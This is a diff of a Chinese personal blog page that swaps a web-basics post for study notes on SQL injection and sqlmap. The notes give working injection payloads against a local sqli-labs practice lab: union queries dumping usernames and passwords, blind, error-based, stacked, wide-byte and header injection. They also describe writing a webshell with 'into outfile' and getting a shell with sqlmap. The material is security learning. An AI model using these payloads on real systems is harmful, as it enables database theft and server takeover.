@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="web基础, Amy">
+    <meta name="keywords" content="sql注入原理及sqlmap的使用, Amy">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web基础 | Amy</title>
+    <title>sql注入原理及sqlmap的使用 | Amy</title>
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -205,12 +205,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208193831482.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web基础</h1>
+                    <h1 class="description center-align post-title">sql注入原理及sqlmap的使用</h1>
                 </div>
             </div>
         </div>
@@ -351,7 +351,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-01
+                    2020-11-28
                 </div>
                 
 
@@ -365,14 +365,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    3.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    13 分
                 </div>
                 
 
@@ -395,124 +395,206 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="BurpSuite的使用"><a href="#BurpSuite的使用" class="headerlink" title="BurpSuite的使用"></a>BurpSuite的使用</h2><h3 id="抓网页的包"><a href="#抓网页的包" class="headerlink" title="抓网页的包"></a>抓网页的包</h3><p>1.配置端口和IP</p>
-<p>2.导入证书(抓https)</p>
-<p>3.浏览器开启BP的代理</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208193831482.png" alt="image-20210208193831482"></p>
-<h3 id="抓APP和微信小程序的包"><a href="#抓APP和微信小程序的包" class="headerlink" title="抓APP和微信小程序的包"></a>抓APP和微信小程序的包</h3><p>抓APP的包和电脑差不多</p>
-<p>发现现在新版的微信抓小程序的包会直接闪退</p>
-<p>But,登上去的时候居然叫我更新?这不陷入死循环了吗😐</p>
-<p>不过想一下,可以先登新版的微信然后给它卸了,留着它的登录数据,再下个老版的回来呀！</p>
-<pre class="line-numbers language-none"><code class="language-none">adb shell pm unstall -k com.tencent.mm
-adb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>用adb把这个删了,然后通过adb安装旧版微信</p>
-<p><img src="https://gitee.com/wxs211/image/raw/master/img/image-20201114194025659.png" alt="image-20201114194025659"></p>
-<p>抓到欢乐斗地主小程序的包啦!</p>
-<h2 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h2><h4 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="1.操作系统"></a>1.操作系统</h4><p>Windows,Linux,Mac那怎么判断一个网站运行在什么系统上呢?</p>
-<p>一个小细节==windows大小写不敏感,而Linux大小写是敏感的==,所以可以通过修改url,看是否报错来判断系统,当然也可以通过抓包来看啦。</p>
-<h4 id="2-搭建平台（服务器软件）"><a href="#2-搭建平台（服务器软件）" class="headerlink" title="2.搭建平台（服务器软件）"></a>2.搭建平台（服务器软件）</h4><p>有iis apache tomcat nginx等一些</p>
-<h4 id="3-脚本语言"><a href="#3-脚本语言" class="headerlink" title="3.脚本语言"></a>3.脚本语言</h4><p>asp php jsp aspx等。。。。</p>
-<p>那怎么看目标网站用的啥脚本语言呢？</p>
-<p>首先一目了然的就是通过URL看啦，举个列子</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194256410.png" alt="image-20210208194256410"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194328666.png" alt="image-20210208194328666"></p>
-<p>当然也可以通过抓包，爬虫，搜索引擎，还有一些专门的工具来查看</p>
-<h4 id="4-数据库"><a href="#4-数据库" class="headerlink" title="4.数据库"></a>4.数据库</h4><p>常见的有mysql，Oracle，阿里云的polardb等一些国内公司自己搞的。。。。</p>
-<p>要使用数据库就必须要给它开放一个端口</p>
-<p>常见的mysql开放的端口一般是3306，Oracle是1521，sqlserver是1433。。。。</p>
-<p>那怎么查看目标网站使用的数据库呢?</p>
-<p>1.可以通过端口扫描，看它开放了什么端口</p>
-<p>2.如果已经知道了目标网站使用的脚本语言就可以推断出它使用的数据库</p>
-<p>一般为了兼容,通常有如下组合</p>
-<p><strong>asp+access</strong></p>
-<p><strong>php+mysql</strong></p>
-<p><strong>aspx+mssql</strong></p>
-<p><strong>jsp+mssql或oracle</strong></p>
-<p>PS:==linux不存在asp aspx ,不存在iis==;</p>
-<h4 id="5-CMS-内容管理系统"><a href="#5-CMS-内容管理系统" class="headerlink" title="5.CMS(内容管理系统)"></a>5.CMS(内容管理系统)</h4><p>cms就是内容管理系统，也可以理解成为网站建设系统。对于一些seo专员来说，内容管理系统可以帮助我们快速的建设任何类型的网站。cms系统的特点就是把网站模版和网站程序完全分开，同时还会提供模版方案，从而让网站的模版设计和程序彻底的分开，让网站设计人员可以对每个页面、栏目都使用不同的模版，随时都能进行编辑和修改。</p>
-<p>内容管理系统使用基于角色的用户管理，通过添加不同权限的用户，可以把网站管理权限分配到不同的用户上，然后把这些用户通过权限来划分各种级别，例如：超级管理人员、栏目管理人员、文档录入人员、审核人员等等，这样网站在发布内容的时候就不会出现任何错误，同时也能保证内容的质量。  </p>
-<h4 id="6-中间件"><a href="#6-中间件" class="headerlink" title="6.中间件"></a>6.中间件</h4><p>个人理解是介于系统和程序直接的一种东西，有了中间件可以简化开发流程，一些功能就不用全都用代码写出来，而是通过调用这个中间件就能够完成某些功能。举个例子，你去寄快递只要填收件人的地址和电话就ok了，快递由谁运，运到了哪儿你并不需要担心，只要快递送到了就好了，这时候快递公司就充当一个中间件的角色</p>
-<h4 id="7-容器"><a href="#7-容器" class="headerlink" title="7.容器"></a>7.容器</h4><p>应用于将操作系统进行隔离的一种技术，避免一个应用的崩溃和影响其他应用的运行</p>
-<p>容器和虚拟机的区别在与容器更加轻量，而虚拟机还需要一个操作系统再在这个系统之上安装应用</p>
-<p>虚拟机一般适用于对不同的用户进行隔离，而容器一般适用于对不同的应用进行隔离</p>
-<p>容器拿来就可以直接使用，不需要考虑环境之类的问题</p>
-<h4 id="8-框架"><a href="#8-框架" class="headerlink" title="8.框架"></a>8.框架</h4><p>拿java来说，Java有三大框架，spring，struts，hibernate</p>
-<p>框架就是一些类和接口的集合，相当与开发中的一个半成品，封装好直接拿来用就可以了 ，省的一遍又一遍敲着重复的代码</p>
-<h2 id="常见的端口服务："><a href="#常见的端口服务：" class="headerlink" title="常见的端口服务："></a>常见的端口服务：</h2><p><strong>端口：20</strong></p>
-<p>​    服务：FTP（文件传输协议）</p>
-<p>​    说明：FTP数据端口</p>
-<p><strong>端口：21</strong></p>
-<p>​    服务：FTP</p>
-<p>​    说明：FTP服务器所开放的端口，用于上传、下载。</p>
-<p>​    最常见故障：用于攻击者寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口</p>
-<p><strong>端口：22</strong></p>
-<p>​    服务：SSh（安全外壳协议）</p>
-<p>​    说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p>
-<p><strong>端口：23</strong></p>
-<p>​    服务：Telnet（远程终端协议）</p>
-<p>​    说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。</p>
-<p><strong>端口：25</strong></p>
-<p>​    服务：SMTP（简单邮件传输协议）</p>
-<p>​     说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM（垃圾邮件）。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。</p>
-<p><strong>端口：53</strong></p>
-<p>​    服务：DNS（域名系统）</p>
-<p>​    说明：UDP端口，DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p>
-<p><strong>端口：67</strong></p>
-<p>​    服务：DHCP（动态主机配置协议）</p>
-<p>​    说明：UDP端口，67端口发放IP</p>
-<p><strong>端口 :  68</strong></p>
-<p>​    服务：DHCP（动态主机配置协议）</p>
-<p>​    说明：UDP端口，68端口发送成功和失败回应</p>
-<p><strong>端口：69</strong></p>
-<p>​    服务：TFTP（简单文件传输协议）</p>
-<p>​    说明：是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的1文件传输服务</p>
-<p><strong>端口：80</strong></p>
-<p>​    服务：HTTP（超文本传输协议）</p>
-<p>​    说明：明文传输。用于网页浏览，互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准 。木马Executor开放此端口。</p>
-<p><strong>端口：110</strong></p>
-<p>​    服务：pop3（邮局协议版本3）</p>
-<p>​    说明：是TCP/IP协议族中的一员，主要用于支持使用客户端远程管理在服务器上的电子邮件。</p>
-<p><strong>端口：123</strong></p>
-<p>​    服务：NTP（网络时间协议）</p>
-<p>​    说明：用来使网络中的各个计算机时间同步的一种协议。它的用途是把计算机的时钟同步到<strong>世界协调时</strong>UTC，其精度在局域网内可达0.1ms，在互联网上绝大多数的地方其精度可以达到1-50ms。它可以使计算机对其服务器或时钟源（如石英钟，GPS等等）进行时间同步，它可以提供高精准度的时间校正，而且可以使用加密确认的方式来防止病毒的协议攻击。</p>
-<p><strong>端口：161</strong></p>
-<p>​    服务：SNMP（简单网络管理协议）</p>
-<p>​     说明：SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p>
-<p><strong>端口：389</strong></p>
-<p>​    服务：LDAP（轻量级目录访问协议）、ILS（定位服务）</p>
-<p>​    说明：LDAP是一种可让任何人找到网络中的组织，个人档案或装置等其他资源的一种软件协议不论是公共因特网或企业内网络。LDAP   服务和ILS服务共用389端口。</p>
-<p><strong>端口：443</strong></p>
-<p>​    服务：Https（超文本传输安全协议）</p>
-<p>​    说明：加密传输。网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。 是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层（安全套接层），HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。</p>
-<p><strong>端口：636</strong></p>
-<p>​    服务：LDAPS</p>
-<p>​    说明：通过安全套接字层的轻型目录访问协议 。</p>
-<p><strong>端口：873</strong></p>
-<p>​    服务：rsync</p>
-<p>​    说明：文件传输服务</p>
-<p><strong>端口：1521</strong></p>
-<p>​    服务：Oracle</p>
-<p><strong>端口：3306</strong></p>
-<p>​    服务：MySQL</p>
-<p>​    说明：SQL连接端口，提供客户端连接服务端 。</p>
-<p><strong>端口：9000</strong></p>
-<p>​    服务：php-fpm</p>
-<p>​    说明：PHP以daemon模式运行</p>
-<h2 id="正向代理，反向代理，端口转发"><a href="#正向代理，反向代理，端口转发" class="headerlink" title="正向代理，反向代理，端口转发"></a>正向代理，反向代理，端口转发</h2><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>代理服务器代理客户端去和目标服务器交互，目标服务器并不知道真正发送请求的客户端是哪个</p>
-<p>类似于你找中介买房，然后中介再去和房东交涉</p>
-<p>通过正向代理可以实现访问连不上的网站😁，也可以设置代理服务器提高访问速度，最最最重要的是可以<strong>隐藏客户端的真实IP</strong></p>
-<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>和正向代理相反，代理服务器接受internet上的请求，然后将其转发给内网服务器，然后将请求结果返回给Internet上请求连接的客户端</p>
-<p>反向代理和正向代理相反，它可以<strong>隐藏服务器的真实IP</strong>，反向代理服务器也可以作为应用层的防火墙来保证网站的安全。</p>
-<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>端口转发就是将一个端口，这个端口可以本机的端口也可以是本机可以访问到的任意主机的端口，转发到任意一台可以访问到的IP上，通常这个IP是公网IP</p>
-<p>适用端口转发的网络环境有以下几种：</p>
-<ol>
-<li><p>服务器处于内网，可以访问外部网络。</p>
+                <p>mysql数据库刚刚学完,学的都是开发用到的建表,增删查改,存储过程之类的知识</p>
+<p>现在来学习学习sql注入.</p>
+<p>sql注入也是基于基础的sql语句来实现对数据库系统的恶意操做的</p>
+<h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><p>首先是<strong>sql注入要满足的条件及原理</strong>:</p>
+<p>1.参数可控:就是可以自定义传入的参数</p>
+<p>2.参数要可以带到数据库查询:传入的参数所拼接成的sql语句,必须带入数据库查询</p>
+<p>在做数据库实验的过程中也发现mysql会有个默认的information_schema数据库,里面有好多好东西啊,在一些表里面可以看到所有的数据库名,表名,还有其他一些数据库的信息。</p>
+<p>还有一些有用的函数,可以查看数据库的基本信息,都用得到</p>
+<pre class="line-numbers language-none"><code class="language-none">@@datadir: 查询数据库的物理路径
+@@version: 查询数据库版本
+version(): 
+database(): 查看数据库名
+user(): 查看mysql用户
+limit m,n: 从m条记录开始取n条记录
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="构造闭合语句"><a href="#构造闭合语句" class="headerlink" title="构造闭合语句"></a>构造闭合语句</h3><p>sql注入需要将前面的语句闭合起来或者是形成自己的sql语句,可以有一下几种方式:</p>
+<p>‘ (单引号)可以把id括起来，使前面的语句闭合</p>
+<p>构造语句的时候，一是要把我们构造的语句释放出来，二是要把结构进行补全或者适当的注释。</p>
+<p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉，当然不同数据库的注释方法也不尽相同。</p>
+<p>/<em>!</em>/ (内联注释可以放在整个sql语句中)</p>
+<p>下面是一些常用的结构</p>
+<pre class="line-numbers language-none"><code class="language-none">or 1=1--+ 
+
+'or 1=1--+ 
+
+"or 1=1--+ 
+
+)or 1=1--+ 
+
+')or 1=1--+ 
+
+") or 1=1--+ 
+
+"))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>感觉思路是比较清晰的，一步一步的扩大对数据库的查询范围，最后获取到有用信息。就是order by查字段有点烦</p>
+<p>一般的union注入感觉都可以安装这个步骤来：</p>
+<p>1.先找到闭合规则</p>
+<p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p>
+<p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到当前的数据库是security</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
+<p>4.查表名</p>
+<p>因为当时union select出来的数据显示2，3</p>
+<p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>5.查用户属性也就是字段</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以发现有三个属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
+<p>6.查完属性就可以查列了，把username全部调出来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
+<p>7.最后就是查用户密码了</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p>
+<p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p>
+<p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201358085.png" alt="image-20210208201358085"></p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=1 --+ 正常
+http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ 正常
+http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ 不正常
+http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ 正常
+综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.根据返回状态判断闭合规则</p>
+<p>3.<strong>经常用到的就是length()和substr()语句，来猜数据库、表名等的长度和正确字母；</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">length()：返回字符串的长度
+substr(str,pos,num) ：截取指定位置指定长度的字符串
+mid(str,pos,num) :截取指定位置指定长度的字符串
+ascii() 查询ascii码中对应的值
+char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol>
+<li><p>只要注入点有sql报错信息，就可以使用报错注入；</p>
 </li>
-<li><p>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p>
+<li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p>
 </li>
-<li><p>服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p>
+<li><p>updatexml报错获取当前数据库：</p>
+<pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>floor报错获取当前数据库：</p>
+<pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>两种方式应该都可行，如果第一个不行就换第二个试试</p>
+</li>
+<li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p>
+</li>
+<li><p>注意这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p>
 </li>
 </ol>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ol>
+<li><p>没有明确的现象，不管是对是错都返回一个状态；</p>
+</li>
+<li><p>但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；</p>
+</li>
+<li><p>我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；</p>
+</li>
+<li><p>同样的找到正确的闭合规则，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；</p>
+</li>
+<li><p>时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；</p>
+</li>
+<li><p>那么判断当前数据库名的长度的语句为：</p>
+<pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是没有延时)，由此来推出数据库长度。</p>
+</li>
+<li><p>判断当前数据库名的第一个和第二个字母的语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p>
+</li>
+<li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p>
+</li>
+</ol>
+<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><ol>
+<li><p>可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；</p>
+</li>
+<li><p>同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；</p>
+</li>
+<li><p>堆叠注入的语句为</p>
+<pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1)
+;select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p>
+</li>
+</ol>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><ol>
+<li>二次注入一共有两个url，一个url用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</li>
+<li>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</li>
+<li>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</li>
+<li>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</li>
+<li>后面就是union注入攻击的常规操作。</li>
+</ol>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><ol>
+<li>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</li>
+<li>一般情况下，此处就不存在sql注入漏洞的；</li>
+<li>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</li>
+<li>宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</li>
+<li>因此构造闭合规则时，在单引号前面加上 %df 就行了；</li>
+<li>之后在闭合规则中写入同union注入的一些查询语句就行了；</li>
+</ol>
+<h4 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h4><p>首先base64是什么?</p>
+<p>Base64是网络上最常见的用于传输8Bit<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457">二进制</a>数据的方法。Base64编码是从二进制到字符的过程，可用于在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/HTTP">HTTP</a>环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p>
+<ol>
+<li>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</li>
+<li>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</li>
+<li>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</li>
+</ol>
+<h4 id="http请求头—cooki注入"><a href="#http请求头—cooki注入" class="headerlink" title="http请求头—cooki注入"></a>http请求头—cooki注入</h4><ol>
+<li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p>
+</li>
+<li><p>常见的http头部注入的参数有：</p>
+<pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p>
+</li>
+<li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
+</li>
+</ol>
+<h4 id="http请求头—XFF注入"><a href="#http请求头—XFF注入" class="headerlink" title="http请求头—XFF注入"></a>http请求头—XFF注入</h4><ol>
+<li>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</li>
+<li>例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；</li>
+<li>之后使用union注入的方法完成即可。</li>
+</ol>
+<h4 id="知道绝对路径的注入"><a href="#知道绝对路径的注入" class="headerlink" title="知道绝对路径的注入"></a>知道绝对路径的注入</h4><ol>
+<li>如果知道了网站的根目录，并且知道此站点存在sql注入；</li>
+<li>猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用蚁剑连接；</li>
+<li>如果数据库没有file权限，就用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；</li>
+<li>如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；</li>
+<li>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</li>
+</ol>
+<h3 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h3><p>sqlmap支持一下五种注入：</p>
+<ol>
+<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>联合查询注入，可以使用union的情况下的注入。</li>
+<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ol>
+<p>下面有简要的操作概述</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201453846.png" alt="image-20210208201453846"></p>
+<p>命令太多了，还不太熟练，目前只会用一点</p>
+<p>一些基本命令</p>
+<h4 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1.输出等级 V"></a>1.输出等级 V</h4><p><code>V</code> 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p>
+<p>默认是 1，也可以在命令后指定 <code>-v 3</code> 就是等级 3 的输出。</p>
+<pre class="line-numbers language-none"><code class="language-none">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；
+1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；
+2：同时显示调试信息 [DEBUG]；
+3：同时显示注入使用的攻击荷载；
+4：同时显示 HTTP 请求；
+5：同时显示 HTTP 响应头；
+6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
